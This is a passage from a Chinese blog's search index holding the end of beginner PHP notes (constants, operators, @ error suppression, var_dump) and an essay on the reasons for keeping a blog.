<p>5、系统常量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">　　<span class="keyword">echo</span> <span class="keyword">__FILE__</span>; 获取文件位置</div><div class="line">　　<span class="keyword">echo</span> <span class="keyword">__LINE__</span>; 当前代码在第几行</div><div class="line">　　<span class="keyword">echo</span> PHP_VERSION; PHP版本</div><div class="line">　　<span class="keyword">echo</span> PHP_OS; 操作系统 </div></pre></td></tr></table></figure></p>
<p>6、判断常量是否被定义<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">　　$<span class="keyword">is</span> = defined(标识符);返回<span class="keyword">bool</span>值</div></pre></td></tr></table></figure></p>
<p>7、赋值运算符&amp;<br>　　$a=&amp;$b;引用赋值，意味着两个变量都指向同一个数据。它将使两个变量共享一块内存，如果这个内存存储的数据变了，那么两个变量的值都会发生变化。  </p>
<p>8、比较运算符<br>　　===全等：$a等于$b 并且数据类型相同<br>　　&lt;&gt;或!=不等 数据类型不同无所谓  </p>
<p>9、判断数据类型<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">　　var_dump()<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p>10、错误控制运算符<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$conn= <span class="symbol">@mysql_connect</span>(<span class="string">"localhost"</span>,<span class="string">"username"</span>,<span class="string">"password"</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p>　　错误控制前缀“@”不会屏蔽解析错误的信息，不能把它放在函数或类的定义之前，也不能用于条件结构例如if和foreach等。  </p>
<p>11、算术运算符<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">　　ceil（）<span class="comment">; 向上取整</span></div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> PHP </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[为什么要写博客？]]></title>
      <url>/2015/02/15/Life/%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<p>If you can quit,then quit.If you can’t quit,you’re a writer.  </p>
<a id="more"></a>  
<h2 id="一、博客的内容"><a href="#一、博客的内容" class="headerlink" title="一、博客的内容"></a>一、博客的内容</h2><p>1、不是生活杂记、不是流水账、不是牢骚、不是抱怨、不是心情琐记……  </p>
<p>2、有目的地写，要务实，追求质量  </p>
<p>3、承认真实的自己，不要吹嘘，不要装逼，无需讨好读者  </p>
<p>4、记录自己学习、思考、总结的过程  </p>
<p>5、分享你的故事、所得、感想、经验  </p>
<h2 id="二、值得写的原因"><a href="#二、值得写的原因" class="headerlink" title="二、值得写的原因"></a>二、值得写的原因</h2><p>1、重新认识自己<br>①请你介绍一下你自己，你是个什么样的人？  </p>
<p>②你有什么理想吗？这个理想是怎么形成的？  </p>
<p>③你理想的伴侣关系是什么样的？你自己在这个伴侣关系中扮演什么样的角色？要承担什么样的责任？  </p>
<p>④你理想的事业是什么，你正在做的工作符合你的事业理想吗？这份工作对你的意义是什么？  </p>
<p>⑤你对亲子关系怎么看？对你来说，什么是一个理想的父亲（母亲），你期望自己成为这样一个理想父亲（母亲）吗？  </p>
<p>⑥你对钱怎么看，你认为赚到多少钱是足够的？如果你明天一早醒来，已经有足够的钱，你将会如何继续安排自己的生活？  </p>
<p>⑦对你来说，什么是理想的性生活？什么是理想的性道德，在你的性道德观中，什么样的性生活是禁忌的，需要避免的，什么样的性生活是美好的，需要得到鼓励和发展的？  </p>
<p>⑧你的择友标准是什么？什么样的人你会愿意交往，什么样的人你会拒绝和他交往？  </p>
<p>⑨你对死亡怎么看？你希望自己活到多少岁，你准备怎么度过从现在到死亡的这段时间？如果你要立遗嘱，这份遗嘱会怎么写？  </p>
<p>2、学习与积累<br>①通过个人的知识管理促使自己不断学习，提高核心竞争力。<br>写并不是单纯的写。  </p>
<p>②例如你写着写着，你突然忘记了一个概念，于是上网找，找回来这个概念的时候，你重温这个概念，可能还会顺便看了一下这个概念的其他东西。  </p>
<p>③例如你需要获取第一手的资料，寻找信息来源本身就是一个知识积累的过程，同时，你慢慢就学会了鉴别知识：什么是没有用的心灵鸡汤，什么是不值得关注的吐槽名人，还有，在这个过程中，你还养成你的心智。  </p>
<p>3、提高将事情讲清楚的能力<br>①很多东西你以为懂了，但当你在写下来的时候，你就觉得无从下手了。  </p>
<p>②如果一件事情你不能讲清楚，十有八九你还没有完全理解。  </p>
<p>③将事情写下来，慢慢就可以提高你的逻辑思维能力，分析能力，写会迫使你在你脑中搭建一个有条理的框架。例如我写这篇文章一样，我就将值得写博客的原因一点一点地罗列出来，事情就更加清晰，你也可以更好的思考问题。  </p>
<p>4、分享<br>①通过分享，你获得了直接而快速的回报，你最终或许会发现你已将版权和“保留所有权利”抛诸脑后。新的经济学准则是：参与你作品的人越多，回报越高。在分享主义里，如果你愿意你可以保留所有权，但是我乐于分享。  </p>
<p>5、记录成长<br>①隔一段时间，你再回头看你写的博客，你会发现自己正在通过这样的方式在不断的成长，这种成长在自己眼里是一种财富，在别人眼里是一张地图，你得到了收获，不断修正自己的错误，别人得到了指引，避免走弯路。</p>
<p>②更多的情况是当你回望自己的时候你会发现自己是一个傻逼，so what，that is what I am！  </p>
<p>6、培养持续做一件事情的能力<br>①开始是坚持，后来是习惯，接着喜欢。以后当有人对你说，「你写那么多有用的东西，你真的很厉害啊！」你可以笑而不语，也可以大声说道：「你妹，你不知道我开始的时候多么痛苦！」</p>
<p>②让你长久地去跑步，你可能做不到；让你每个月看一本书，你也可能做不到；但让你持续地写一个博客，你可以做得到。</p>
<p>③你不相信？你不试试你怎么知道？</p>
<p>④默默地持续做一件事是一种难得的能力，也是一种难得的品质。  </p>
<p>7、一个人在做一件属于自己的事<br>①很多你认为自己很牛逼的事情都是自己一个人做出来。</p>
<p>②别人在刷微博，你在看书，别人在看穿越剧，你在学英文，别人在去唱K，你在写个人总结。吃饭也要找同伴，出游要找同伴，看电影要找同伴，你上一次一个人在做一件属于自己的事是在什么时候？</p>
<p>③如果你想要清晰地思考，就必须远离人群。但是走得越远，你的处境就会越困难，收到的阻力也会越大。因为你没有迎合社会习俗，而是一步步地与它背道而驰。如果自己就是潮水的一部分 ，怎么能看见潮流的方向呢？你只能永远保持质疑，问自己，什么话是我不能说的？为什么？——Paul Graham《不能说的话》  </p>
]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> blog </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
